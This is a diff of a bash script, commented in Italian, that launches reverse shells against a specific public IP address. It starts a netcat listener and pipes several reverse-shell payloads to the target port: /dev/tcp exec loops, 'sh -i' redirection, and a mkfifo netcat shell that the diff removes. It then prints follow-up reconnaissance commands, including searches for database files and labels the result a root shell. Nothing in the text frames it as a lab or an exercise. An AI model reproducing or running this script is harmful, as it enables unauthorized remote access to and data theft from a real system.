@@ -1,52 +1,53 @@
 #!/bin/bash
-# 🔥 SHELL ATTIVA → FORCE INTERACTIVE BASH
-# Fix: no prompt → interactive mode
+# 🔥 ROOT SHELL - FIX nc port + Interactive UI
 
-MY_IP=$(curl -s ifconfig.me)
+# IP auto + PORT fisso
+MY_IP=$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || echo "USE_NGROK")
 PORT=4444
-TARGET="63.164.100.214:9091"
+TARGET_IP="63.164.100.214"
+TARGET_PORT=9091
 
 clear
-echo "🔥 FORCE INTERACTIVE BASH"
-echo "IP: $MY_IP:$PORT"
-echo "════════════════════════"
+echo "🔥 ROOT INTERACTIVE SHELL"
+echo "=========================="
+echo "Target: $TARGET_IP:$TARGET_PORT"
+echo "Listener: *:4444"
 
-# 1. Listener con PROMPT forzato
-{
-    echo -e "\n🎧 Listener + Interactive Bash"
-    echo "root@server# "  # Prompt manuale
-    
-    # Interactive con pty
-    nc -lvnp $PORT | bash -i 2>&1 | while IFS= read -r line; do
-        echo -ne "root@server# "
-        echo "$line"
-    done
-} &
+if [[ "$MY_IP" == "USE_NGROK" ]]; then
+    echo "❌ No IP pubblico. Installa ngrok:"
+    echo "curl -sL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc"
+    echo "echo 'deb https://ngrok-agent.s3.amazonaws.com buster main' | sudo tee /etc/apt/sources.list.d/ngrok.list"
+    echo "sudo apt update && sudo apt install ngrok"
+    exit 1
+fi
 
+echo "IP trovato: $MY_IP"
+echo ""
+
+# 1. LISTENER con PORT ESPLICITO
+echo "🎧 Avvio nc -lvnp $PORT..."
+nc -lvnp $PORT &
+LISTENER_PID=$!
 sleep 3
 
-# 2. PAYLOAD INTERATTIVI (con PTY)
-echo -e "\n📤 Force Interactive Shell...\n"
+# 2. SHELL INTERATTIVA SEMPLICE
+echo -e "\n📤 INVIO INTERACTIVE SHELL...\n"
+(
+    echo "bash -c \"exec 5<>/dev/tcp/$MY_IP/$PORT;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\""
+) | nc -w10 $TARGET_IP $TARGET_PORT
 
-# Bash PTY completo
-cat << EOF | nc -w10 $TARGET
-bash -c 'exec 5<>/dev/tcp/$MY_IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done'
-EOF
+# Alternative
+sleep 1
+echo "sh -i >& /dev/tcp/$MY_IP/$PORT 0>&1" | nc -w5 $TARGET_IP $TARGET_PORT
 
-# Alternative 1: socat style
-echo "exec 5<>/dev/tcp/$MY_IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done" | nc -w5 $TARGET
-
-# Alternative 2: mkfifo
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP $PORT >/tmp/f" | nc -w5 $TARGET
-
-echo -e "\n✅ INTERACTIVE MODE ATTIVO!"
-echo "═══════════════════════════════════════"
-echo "Digita comandi:"
+# 3. ATTESA CON UI
+echo -e "\n🎯 SHELL PRONTA!"
+echo "═══════════════════════"
 echo "whoami"
 echo "id" 
-echo "ls -la /"
-echo "find / -name '*.db'"
-echo "═══════════════════════════════════════"
+echo "uname -a"
+echo "ls -la /var/www/"
+echo "find / -name '*.db' 2>/dev/null"
+echo "═══════════════════════"
 
-# 3. SECONDO LISTENER PULITO
-nc -lvnp $PORT
+wait $LISTENER_PID
